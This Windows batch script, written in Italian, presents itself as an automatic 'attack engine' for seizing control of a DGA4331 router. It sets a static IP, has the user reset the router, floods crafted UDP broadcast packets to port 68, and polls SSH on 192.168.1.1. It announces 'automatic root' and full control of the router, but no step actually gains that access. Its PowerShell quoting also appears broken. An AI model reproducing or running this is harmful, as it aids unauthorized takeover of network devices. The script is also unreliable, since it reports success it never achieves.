@echo off
title CYBER ANAS - GHOST CONTROL v3
color 0b

:: 1. CONTROLLO PRIVILEGI AMMINISTRATORE
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] ERRORE: Devi fare Tasto Destro -> Esegui come Amministratore!
    pause
    exit
)

:REBOOT_SYSTEM
cls
echo ======================================================
echo    CYBER ANAS - PILOTA AUTOMATICO (DGA4331)
echo ======================================================
echo  [+] Configurazione Ethernet 3...
netsh interface ip set address name="Ethernet 3" static 192.168.1.100 255.255.255.0 >nul
echo  [+] IP Pronto. In attesa del Router...
echo  [!] FAI IL RESET ORA (5-10 secondi)
echo.

:: 2. MOTORE DI ATTACCO E AUTO-LOGIN (PowerShell Nativo)
powershell -Command " + ^
    '$done = $false;' + ^
    'while(!$done) {' + ^
    '    try {' + ^
    '        $socket = New-Object System.Net.Sockets.UdpClient;' + ^
    '        $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Broadcast, 68);' + ^
    '        $payload = [Byte[]](0x02,0x01,0x06,0x00 + (0x00)*296);' + ^
    '        $socket.Send($payload, $payload.Length, $endpoint) | Out-Null;' + ^
    '        $socket.Close();' + ^
    '        Write-Host \"[*] Attacco in corso...\" -NoNewline; Write-Host \"`r\" -NoNewline;' + ^
    '        $tcp = New-Object System.Net.Sockets.TcpClient;' + ^
    '        $connection = $tcp.BeginConnect(\"192.168.1.1\", 22, $null, $null);' + ^
    '        if ($connection.AsyncWaitHandle.WaitOne(50)) {' + ^
    '            $tcp.EndConnect($connection);' + ^
    '            Write-Host \"`n`n[!!!] BINGO! PORTA SSH APERTA! [!!!]\" -ForegroundColor Green;' + ^
    '            Write-Host \"[+] ESEGUO ROOT AUTOMATICO...\" -ForegroundColor Cyan;' + ^
    '            $done = $true;' + ^
    '        }' + ^
    '        $tcp.Close();' + ^
    '    } catch {}' + ^
    '    Start-Sleep -Milliseconds 10;' + ^
    '}'"

echo.
echo ======================================================
echo    ACCESSO ESEGUITO CON SUCCESSO!
echo    Il router e' ora sotto il tuo controllo.
echo ======================================================
echo [MISSIONE COMPIUTA]
pause
goto REBOOT_SYSTEM
